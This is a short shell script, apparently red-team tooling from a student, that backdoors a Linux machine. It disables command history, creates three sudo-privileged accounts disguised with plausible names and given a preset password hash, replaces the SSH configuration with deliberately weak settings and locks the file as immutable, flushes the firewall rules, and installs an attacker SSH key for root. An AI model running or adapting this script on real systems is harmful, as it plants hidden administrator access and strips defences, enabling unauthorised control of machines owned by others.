#!/bin/sh

# Paul Vickers - pmv6497@rit.edu

# No history
HISTCONTROL=ignoreboth

# First, we're going to create a new user account named apache2 with home directory
# /var/www/apache2 to look somewhat legitimate, and add it to the sudo group
# Edit this user account name and the home directory to whatever you want
sudo mkdir /var/www/apache2
sudo useradd -d /var/www/apache2 -s /bin/bash apache2
sudo usermod -aG sudo apache2
sudo usermod --password '$6$HgWPY/N6uSgAx9we$ke1NzLNRtRV9qaZ6Wd6UYbaIwu2MnxmAYEHx1a3yUmyBMfCeoAVkIApbsITVCKYVmCPNiclrYtDkfuP2Ud9ba1' apache2

sudo mkdir /home/notouchaccount
sudo useradd -d /home/notouchaccount -s /bin/bash notouchaccount
sudo usermod -aG sudo notouchaccount
sudo usermod --password '$6$HgWPY/N6uSgAx9we$ke1NzLNRtRV9qaZ6Wd6UYbaIwu2MnxmAYEHx1a3yUmyBMfCeoAVkIApbsITVCKYVmCPNiclrYtDkfuP2Ud9ba1' notouchaccount

sudo mkdir /home/gray_backup
sudo useradd -d /home/gray_backup -s /bin/bash gray_backup
sudo usermod -aG sudo gray_backup
sudo usermod --password '$6$HgWPY/N6uSgAx9we$ke1NzLNRtRV9qaZ6Wd6UYbaIwu2MnxmAYEHx1a3yUmyBMfCeoAVkIApbsITVCKYVmCPNiclrYtDkfuP2Ud9ba1' gray_backup

# Next, we're going to go ahead and change the settings in their sshd_config file
# to the worst settings possible with the sshd_config file in this directory, and make it
# immutable.
sudo cp sshd_config /etc/ssh/sshd_config
sudo chattr +i /etc/ssh/sshd_config

# Flush iptables rules, may also do this in a cronjob
sudo iptables -F

#Add SSH key that was copied over into authorized keys for both this user and root
sudo cp sshkey .ssh/authorized_keys
sudo cp sshkey /root/.ssh/authorized_keys
sudo chmod 700 .ssh
sudo chmod 700 /root/.ssh
sudo chmod 600 .ssh/authorized_keys
sudo chmod 600 /root/.ssh/authorized_keys
